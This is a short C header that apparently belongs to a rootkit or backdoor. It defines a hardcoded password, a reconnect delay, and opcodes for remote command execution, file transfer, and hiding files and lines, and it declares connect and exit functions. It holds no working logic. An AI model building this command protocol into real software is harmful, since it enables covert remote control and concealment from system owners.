#ifndef CONNECT_H
#define CONNECT_H

#define WLKOM_PASSWORD  "wlk0m_s3cr3t"
#define RECONNECT_DELAY  5  // seconds between reconnection attempts

// Commands opcodes (1 byte)
#define CMD_AUTH        0x01
#define CMD_EXEC        0x02
#define CMD_UPLOAD      0x03
#define CMD_DOWNLOAD    0x04
#define CMD_HIDE_FILE   0x05
#define CMD_UNHIDE_FILE 0x06
#define CMD_HIDE_LINE   0x07
#define CMD_UNHIDE_LINE 0x08
#define CMD_PING        0x09
#define CMD_PONG        0x0A

int  connect_init(const char *ip, int port);
void connect_exit(void);

#endif
